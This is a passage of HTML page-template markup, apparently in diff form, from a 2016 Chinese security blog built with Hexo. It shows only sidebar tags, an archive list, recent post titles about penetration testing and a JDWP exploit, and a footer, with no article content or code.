<a href="/tag/误删书签/" style="font-size: 10px;">误删书签</a> <a href="/tag/轻量级Linux/" style="font-size: 10px;">轻量级Linux</a> <a href="/tag/输入法/" style="font-size: 10px;">输入法</a> <a href="/tag/运维/" style="font-size: 11px;">运维</a> <a href="/tag/通杀漏洞/" style="font-size: 10px;">通杀漏洞</a> <a href="/tag/速成建站/" style="font-size: 10px;">速成建站</a> <a href="/tag/邮件注入/" style="font-size: 10px;">邮件注入</a> <a href="/tag/钓鱼/" style="font-size: 10px;">钓鱼</a> <a href="/tag/银行/" style="font-size: 10px;">银行</a> <a href="/tag/银行信息/" style="font-size: 10px;">银行信息</a> <a href="/tag/键盘上的符号英文怎么读/" style="font-size: 10px;">键盘上的符号英文怎么读</a> <a href="/tag/防黑/" style="font-size: 10px;">防黑</a> <a href="/tag/阳光娱乐联盟/" style="font-size: 10px;">阳光娱乐联盟</a> <a href="/tag/集群/" style="font-size: 10px;">集群</a> <a href="/tag/面向对象/" style="font-size: 10px;">面向对象</a> <a href="/tag/黑产/" style="font-size: 11px;">黑产</a> <a href="/tag/黑客/" style="font-size: 15px;">黑客</a> <a href="/tag/黑帽/" style="font-size: 10px;">黑帽</a> <a href="/tag/黑盒分析/" style="font-size: 10px;">黑盒分析</a> <a href="/tag/黑站/" style="font-size: 10px;">黑站</a> <a href="/tag/黑色产业/" style="font-size: 10px;">黑色产业</a> <a href="/tag/黑阔/" style="font-size: 10px;">黑阔</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Arkiv</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">July 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">June 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/05/">May 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/04/">April 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">March 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/01/">January 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/12/">December 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/09/">September 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/08/">August 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/07/">July 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/06/">June 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/05/">May 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/04/">April 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/03/">March 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/02/">February 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/01/">January 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/12/">December 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/11/">November 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/10/">October 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/11/">November 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/09/">September 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/08/">August 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/07/">July 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/06/">June 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/05/">May 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/04/">April 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/03/">March 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/02/">February 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/01/">January 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/12/">December 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/11/">November 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/10/">October 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/09/">September 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/08/">August 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/07/">July 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/06/">June 2011</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Siste innlegg</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/1145.seo/">Burpsuite之Burp Collaborator模块介绍</a>
+          </li>
+        
+          <li>
+            <a href="/1144.seo/">Debian 8.3 Mate搭建渗透测试环境</a>
+          </li>
+        
+          <li>
+            <a href="/1143.seo/">Debian Jessie搭建Mattermost</a>
+          </li>
+        
+          <li>
+            <a href="/1142.seo/">C# IPv6的Socket编程</a>
+          </li>
+        
+          <li>
+            <a href="/1141.seo/">JDWP系统命令漏洞执行利用实例</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2016 Secer<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
